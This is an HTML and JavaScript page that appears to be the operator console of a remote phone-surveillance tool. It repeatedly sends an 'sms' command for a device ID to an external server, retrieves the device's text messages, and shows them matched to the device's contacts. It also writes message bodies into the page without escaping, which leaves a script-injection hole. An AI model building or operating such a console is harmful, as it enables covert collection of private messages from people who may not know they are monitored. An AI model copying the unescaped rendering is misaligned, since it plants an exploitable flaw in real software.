<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Live Messages - Admin Panel</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        :root {
            --bg-color: #000000;
            --glass-bg: rgba(28, 28, 30, 0.9);
            --bubble-received: #262628;
            --bubble-sent: #0b84ff;
            --text-main: #ffffff;
            --text-muted: #8e8e93;
            --border-color: #38383a;
            --accent-green: #30d158;
        }

        body {
            background-color: var(--bg-color);
            color: var(--text-main);
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            margin: 0; padding: 10px;
            display: flex; justify-content: center;
        }

        .container {
            width: 100%; max-width: 500px;
            background: #000;
            min-height: 100vh;
            padding-bottom: 20px;
        }

        /* --- Header --- */
        .header {
            position: sticky; top: 0;
            background: rgba(0, 0, 0, 0.85);
            backdrop-filter: blur(12px);
            z-index: 100;
            padding: 15px 10px;
            border-bottom: 1px solid var(--border-color);
        }

        .top-row {
            display: flex; justify-content: space-between; align-items: center;
            margin-bottom: 10px;
        }

        .page-title { font-size: 1.8rem; font-weight: bold; }
        
        .live-indicator {
            font-size: 0.8rem; color: var(--accent-green);
            display: flex; align-items: center; gap: 5px;
            background: rgba(48, 209, 88, 0.1);
            padding: 4px 8px; border-radius: 12px;
        }

        .blink { animation: blinker 1.5s linear infinite; }
        @keyframes blinker { 50% { opacity: 0.4; } }

        .back-btn {
            color: #0b84ff; font-size: 1.1rem; text-decoration: none;
            display: flex; align-items: center; gap: 5px;
        }

        /* --- Search --- */
        .search-box { position: relative; }
        
        .search-input {
            width: 100%;
            background: #1c1c1e;
            border: none;
            padding: 10px 35px;
            border-radius: 10px;
            color: white;
            font-size: 1rem;
            box-sizing: border-box;
        }
        .search-icon {
            position: absolute; left: 12px; top: 50%; transform: translateY(-50%);
            color: var(--text-muted); font-size: 0.9rem;
        }

        /* --- SMS List --- */
        .sms-list {
            display: flex; flex-direction: column; gap: 12px;
            padding: 15px 10px;
        }

        .sms-card {
            background: var(--bubble-received);
            padding: 14px;
            border-radius: 18px;
            position: relative;
            /* Animation HATA DIYA gaya hai taaki shake na ho */
        }

        .sms-header {
            display: flex; justify-content: space-between; align-items: flex-start;
            margin-bottom: 6px;
        }

        .sender-info { display: flex; flex-direction: column; }
        .sender-name { font-size: 1rem; font-weight: 600; color: #fff; }
        .sender-number { font-size: 0.75rem; color: var(--text-muted); margin-top: 2px; }

        .time-badge {
            font-size: 0.75rem; color: var(--text-muted);
            white-space: nowrap;
        }

        .message-body {
            font-size: 0.95rem; color: #e0e0e0; line-height: 1.4;
            word-wrap: break-word;
        }
    </style>
</head>
<body>

    <div class="container">
        <div class="header">
            <div class="top-row">
                <a href="index.html" class="back-btn"><i class="fa-solid fa-chevron-left"></i> Back</a>
                <span class="page-title">Messages</span>
                <div class="live-indicator"><i class="fa-solid fa-circle blink"></i> Live</div>
            </div>
            
            <div class="search-box">
                <i class="fa-solid fa-search search-icon"></i>
                <input type="text" id="searchInput" class="search-input" placeholder="Search name or message..." onkeyup="filterSMS()">
            </div>
        </div>

        <div id="sms-list" class="sms-list">
            <div style="text-align: center; color: #666; margin-top: 50px;">
                <i class="fa-solid fa-spinner fa-spin" style="font-size: 20px;"></i><br><br>
                Connecting to device...
            </div>
        </div>
    </div>

<script>
    const SERVER_URL = "https://child-v9no.onrender.com";
    const urlParams = new URLSearchParams(window.location.search);
    const DEVICE_ID = urlParams.get('id') ? urlParams.get('id').toUpperCase() : null;
    
    const storageKeySMS = `sms_${DEVICE_ID}`;
    const storageKeyContacts = `contacts_${DEVICE_ID}`;

    let allSMSData = []; 
    let contactMap = {}; 
    let isFetching = false; 

    document.addEventListener("DOMContentLoaded", function() {
        if (!DEVICE_ID) {
            alert("Device ID missing!");
            return;
        }
        
        prepareContactMap();
        loadFromStorage();
        
        startLiveSystem();
    });

    function prepareContactMap() {
        const savedContacts = localStorage.getItem(storageKeyContacts);
        if (savedContacts) {
            try {
                const contacts = JSON.parse(savedContacts);
                contacts.forEach(c => {
                    let cleanNum = c.number.replace(/\D/g, '').slice(-10);
                    if(cleanNum) contactMap[cleanNum] = c.name;
                });
            } catch(e) {}
        }
    }

    function getContactName(originalNum) {
        if (!originalNum) return "Unknown";
        let cleanNum = originalNum.replace(/\D/g, '').slice(-10);
        return contactMap[cleanNum] || originalNum;
    }

    function loadFromStorage() {
        const savedData = localStorage.getItem(storageKeySMS);
        if (savedData) {
            allSMSData = JSON.parse(savedData);
            renderSMS(allSMSData);
        }
    }

    // --- LIVE SYSTEM ---
    function startLiveSystem() {
        sendCommand();
        fetchSMS();
        setInterval(sendCommand, 10000);
        setInterval(fetchSMS, 3000);
    }

    function sendCommand() {
        fetch(`${SERVER_URL}/api/send-command`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ device_id: DEVICE_ID, command: 'sms' })
        }).catch(() => {}); 
    }

    function fetchSMS() {
        if(isFetching) return;
        isFetching = true;

        fetch(`${SERVER_URL}/api/get-data/${DEVICE_ID}/sms?t=${Date.now()}`)
            .then(res => res.json())
            .then(data => {
                if (data && data.length > 0) {
                    if (JSON.stringify(data) !== JSON.stringify(allSMSData)) {
                        allSMSData = data;
                        localStorage.setItem(storageKeySMS, JSON.stringify(data));
                        
                        const query = document.getElementById('searchInput').value;
                        if(query === "") {
                            renderSMS(allSMSData);
                        } else {
                            filterSMS();
                        }
                    }
                }
            })
            .catch(() => {})
            .finally(() => { isFetching = false; });
    }

    function filterSMS() {
        const query = document.getElementById('searchInput').value.toLowerCase();
        const filtered = allSMSData.filter(sms => {
            const body = (sms.body || "").toLowerCase();
            const address = (sms.address || "").toLowerCase();
            const name = getContactName(sms.address).toLowerCase();
            return body.includes(query) || address.includes(query) || name.includes(query);
        });
        renderSMS(filtered);
    }

    // --- STABLE RENDER FUNCTION (FIXED) ---
    function renderSMS(data) {
        const listContainer = document.getElementById("sms-list");
        
        if (!data || data.length === 0) {
            listContainer.innerHTML = '<div style="text-align: center; color: #666; margin-top: 50px;">No messages found.</div>';
            return;
        }

        // ðŸ”¥ FIX: Current Scroll position save karo
        const scrollPos = window.scrollY;

        const displayData = data.slice(0, 100); 

        const htmlString = displayData.map(sms => {
            const name = getContactName(sms.address);
            const isSaved = name !== sms.address;
            
            let formattedDate = "";
            if (!isNaN(sms.date)) {
                const d = new Date(parseInt(sms.date));
                const datePart = d.toLocaleDateString('en-US', { month: 'short', day: 'numeric' }); 
                const timePart = d.toLocaleTimeString('en-US', { hour: 'numeric', minute: '2-digit', hour12: true }); 
                formattedDate = `${datePart}, ${timePart}`;
            }

            return `
                <div class="sms-card">
                    <div class="sms-header">
                        <div class="sender-info">
                            <span class="sender-name">${isSaved ? name : sms.address}</span>
                            ${isSaved ? `<span class="sender-number">${sms.address}</span>` : ''}
                        </div>
                        <span class="time-badge">${formattedDate}</span>
                    </div>
                    <div class="message-body">
                        ${sms.body || 'No Content'}
                    </div>
                </div>
            `;
        }).join('');

        listContainer.innerHTML = htmlString;

        // ðŸ”¥ FIX: Scroll wapas wahi set karo jaha tha
        window.scrollTo(0, scrollPos);
    }
</script>
</body>
</html>
